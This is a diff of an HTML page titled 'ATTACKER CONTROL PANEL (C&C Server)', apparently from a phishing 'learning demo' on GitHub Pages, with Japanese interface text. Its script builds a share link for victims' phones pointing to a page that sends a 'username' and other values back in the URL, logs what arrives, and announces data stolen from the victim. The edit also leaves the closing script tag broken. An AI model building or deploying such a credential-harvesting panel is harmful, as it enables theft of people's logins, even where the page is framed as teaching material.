@@ -10,15 +10,15 @@
 
   <div class="admin-header">
     <h1>🔴 ATTACKER CONTROL PANEL (C&C Server)</h1>
-    <div id="connection-status" style="color: #2ed573; font-weight: bold;">🟢 リアルタイム監視中（URL直結モード）</div>
+    <div id="connection-status" style="color: #2ed573; font-weight: bold;">🟢 監視中（URL直結モード・通信制限完全回避）</div>
   </div>
 
-  <!-- QRコード用のリンク表示 -->
+  <!-- QRコードとリンクコピーパネル（ファイル名を ac.png に変更） -->
   <div style="background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 20px;">
     <img src="ac.png" alt="接続用QRコード" style="width: 100px; height: 100px; background: white; padding: 4px; border-radius: 6px;">
     <div>
       <h3 style="color: #58a6ff; margin-bottom: 5px;">スマホ接続用URL</h3>
-      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取ってください。</p>
+      <p style="font-size: 13px; color: #8b949e; margin-bottom: 10px;">スマホでQRコードを読み取るか、下のリンクをコピーしてください。</p>
       <button class="btn-copy" onclick="copyShareUrl()" style="padding: 6px 12px; background: #238636; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">リンクをコピー</button>
     </div>
   </div>
@@ -43,19 +43,19 @@
   </table>
 
   <script>
-    // GitHub Pagesの自分の管理者画面のURLをベースにする
+    // 管理者画面のURLを基準にして、スマホ用の共有URLを自動生成する
     const currentAdminUrl = window.location.href.split('?')[0];
-    const shareUrl = `index.html?admin=${encodeURIComponent(currentAdminUrl)}`;
+    const shareUrl = `https://sui6600.github.io/learning-demo/index.html?admin=${encodeURIComponent(currentAdminUrl)}`;
 
     function copyShareUrl() {
-      navigator.clipboard.writeText(window.location.origin + window.location.pathname.replace('admin.html', '') + shareUrl).then(() => {
+      navigator.clipboard.writeText(shareUrl).then(() => {
         alert("スマホ用リンクをコピーしました！");
       });
     }
 
     let logs = [];
 
-    // ページが読み込まれたときに、URLにくっついてきたデータがあるかチェックする
+    // ページが開かれたときにURLにくっついてきたデータがあるかチェック
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('username')) {
       const log = {
@@ -67,7 +67,6 @@
       logs.unshift(log);
       renderLogs();
       
-      // ステータスを「データ強奪成功」に変更
       document.getElementById('connection-status').innerText = "🔥 被害者からのデータを強奪成功！";
       document.getElementById('connection-status').style.color = "#ff4757";
     }
@@ -90,7 +89,5 @@
         listContainer.appendChild(tr);
       });
     }
-  </script>
-</body>
-</html>
+  </script
 
